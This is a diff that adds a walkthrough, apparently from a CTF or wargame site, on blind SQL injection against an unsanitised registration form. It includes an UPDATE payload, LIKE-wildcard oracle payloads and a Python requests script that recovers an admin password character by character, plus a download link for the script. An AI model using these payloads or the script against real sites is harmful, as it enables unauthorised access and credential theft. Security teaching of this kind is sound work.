@@ -50,9 +50,104 @@
             </center>
 
             <p>
+                Now they've added a registration system and if we check out the source of the login script we can see it's rock solid, all the user input is sanitized, so no injections there.
+            </p>
+            <p>
+                But the registration on the other hand... If we look at the source we can see it's not sanitzed at all, so what we need to do is try and get into the login system as admin
+            </p>
+            <p>
+                Our first idea might be to updated the admin row in the user's table like the following
             </p>
             <div class="large-12 panel code columns">
+                admin'; UPDATE users SET password=123 WHERE username='admin';#
             </div>
+            <p>
+                but alas, the database user only has SELECT privileges on the database so we need to find a different way in.
+            </p>
+            <p>
+                If we inspect the register code we can see that if the query results in 1 or more rows it will tell us that the user has already been registered and if there are no rows it tells us that the registration has been disabled, this doesn't matter on the other hand.
+            </p>
+            <p>
+                With this we have a sort of mecanism that we can run a query and get a true / false signal from it, "already registerd" being true and "registration disabled" being false.
+            </p>
+            <p>
+                So we can ask the database these yes or no questions about the admin's password. Using SQL's <a href="http://www.w3schools.com/sql/sql_wildcards.asp">Wildcards</a> like % that means match zero or more of any character, we can intelligently "brute force" the admin's password with queries like
+            </p>
+            <div class="large-12 panel code columns">
+                admin' AND password = "a%";#
+            </div>
+            <p>
+                If this were to return "already registered" we know that the admin's password begins with an "a". But seeing as this password is probably really long we should probably automate it with a script... since we're lazy
+            </p>
+            <p>
+                For this script we're going to use Python because it's simple and easy to understand. And we'll be using the <a href="http://docs.python-requests.org/en/latest/">Requests</a> library to send our malicous requests, you probably need to install this if you want to run the script
+            </p>
+            <p>
+                We'll start by importing the library
+            </p>
+            <div class="large-12 panel code columns">
+                import requests
+            </div>
+            <p>
+                We'll assume that the admin password is strictly lowercase letters
+            </p>
+            <div class="large-12 panel code columns">
+                alphabet = "abcdefghijklmnopqrstuvwxyz"
+            </div>
+            <p>
+                Now we'll loop through each letter in the alphabet and construct our malicous query
+            </p>
+            <div class="large-12 panel code columns">
+                for letter in alphabet:<br/>
+                &nbsp;&nbsp;&nbsp;&nbsp;injection = "admin' AND password LIKE \"" + password + letter + "%\";#"
+            </div>
+            <p>
+                password being an empty variable that we append to later. Next we need to send this to the website via POST
+            </p>
+            <div class="large-12 panel code columns">
+                payload = {'username': injection}<br/>
+                response = requests.post(url, data=payload).text
+            </div>
+            <p>
+                First we constructed our "payload" then we sent it via POST to the url that is a variable with url to the registration page, then we extract the text from the response
+            </p>
+            <p>
+                Now we need to check wheter the answer was true or false. The easiest way is to check whether the text is not equal to the "registration disabled" response
+            </p>
+            <div class="large-12 panel code columns">
+                if(response != "Registration has been disabled."):<br/>
+                &nbsp;&nbsp;&nbsp;&nbsp;password += letter<br/>
+                &nbsp;&nbsp;&nbsp;&nbsp;break
+            </div>
+            <p>
+                if that is true we add the letter to what we know of the password and then break because we got what we wanted
+            </p>
+            <p>
+                If it is false on the other hand, we make sure that it's not the last character we're testing because if so, that means we've got our password
+            </p>
+            <div class="large-12 panel code columns">
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br/>
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(letter == alphabet[-1]):<br/>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;finished = True<br/>
+                    &nbsp;&nbsp;&nbsp;&nbsp;if(finished):<br/>
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break<br/>
+                print(password)
+            </div>
+            <p>
+                And now if you run this script you should get the following output
+            </p>
+            <div class="large-12 panel code columns">
+                youllneverguessthispassword<br/>
+                Cracked in 167 seconds
+            </div>
+        </div>
+    </div>
+
+    <div class="row">
+        <div style="padding-bottom: 2rem;" class="large-6 large-centered columns">
+            <a style="font-size: 15pt;" href="script.py" class="glowbutt large prefix radius button">
+                Download Script
+            </a>
         </div>
     </div>
 
